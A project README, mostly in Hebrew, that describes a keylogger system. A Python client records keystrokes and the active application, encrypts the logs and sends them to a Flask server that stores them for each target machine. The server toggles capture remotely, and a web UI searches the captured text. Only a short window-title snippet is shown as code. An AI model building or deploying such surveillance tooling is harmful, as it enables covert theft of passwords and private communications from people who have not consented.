# Keylogger Management System

## מבנה הפרויקט ומבנה הקבצים

### `keylogger.py` (צד ה-Client)

- **תפקיד עיקרי**:  
  מאזין ללחיצות מקלדת באמצעות ספריית `pynput`, מאגד תווים למילים (מתעלם מלחיצות מיוחדות חוץ מ־space ו־backspace), משייך לאפליקציה הפעילה ולזמן, ומאחסן בלוגים.  

- **שליחה לשרת**:  
  כל שנייה שולח את הלוגים המוצפנים לשרת דרך `POST` לכתובת `/api/upload`. משתמש ב־`Fernet` להצפנה.  

- **ניהול מצב**:  
  Polling כל 2 שניות לשרת (`/api/toggle`) כדי לבדוק אם להפעיל/לכבות את ה־keylogger.  

- **ריצה**:  
  רץ כתהליך רקע, ניתן להפסיק עם `Ctrl+C`.  


### `app.py` (צד ה-Server)

- **תפקיד עיקרי**:  
  שרת Flask שמארח API וממשק web. מקבל נתונים מוצפנים, מפענח ומאחסן אותם כקבצי JSON בתיקיות נפרדות לכל מכונה (`data` ו־`decrypted_data`).  

- **API endpoints**:  
  - `/api/upload`: קליטת לוגים מוצפנים.  
  - `/api/toggle`: שליטה במצב (GET/POST) לכל מכונה.  
  - `/api/getData/<machine>`: החזרת לוגים למכונה ספציפית.  
  - `/api/getTargetMachinesList`: רשימת מכונות זמינות.  
  - `/api/deleteLogs/<machine>`: מחיקת לוגים.  
  - `/api/addUser`, `/api/deleteUser`, `/api/validateUser`: ניהול משתמשים (מאוחסנים כקובצי JSON).  

- **אחסון**:  
  משתמש בתיקיות מקומיות (`data`, `decrypted_data`) לאחסון לוגים מוצפנים ומפוענחים.  


### קבצי HTML (ממשק ה-Web)

- **`log_in.html`**: דף כניסה עם אימות משתמש (הוספה/מחיקה/אימות).  
- **`WebsiteView.html`**: רשימת מכונות זמינות, עם כפתור התנתקות.  
- **`individualUinit.html`**: ממשק למכונה אחת: חיפוש בלוגים (לפי זמן, אפליקציה, מילה), הצגת נתונים, מחיקה ורענון.  

---

## זרימת העבודה

1. **Client שולח לוגים** →  
2. **Server מקבל ומפענח** →  
3. **Web UI מציג ומנהל**  

המערכת משתמשת ב־`threading` כדי להריץ במקביל שליחה, polling והאזנה למקלדת.  

---

## התאמה בין macOS ל־Windows

ב־`keylogger.py`, בפונקציה `get_active_application()`:

- **Windows** (מושבת כברירת מחדל):  
```python
if platform.system() == "Windows":
    import win32gui
    hwnd = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(hwnd) or "Unknown"
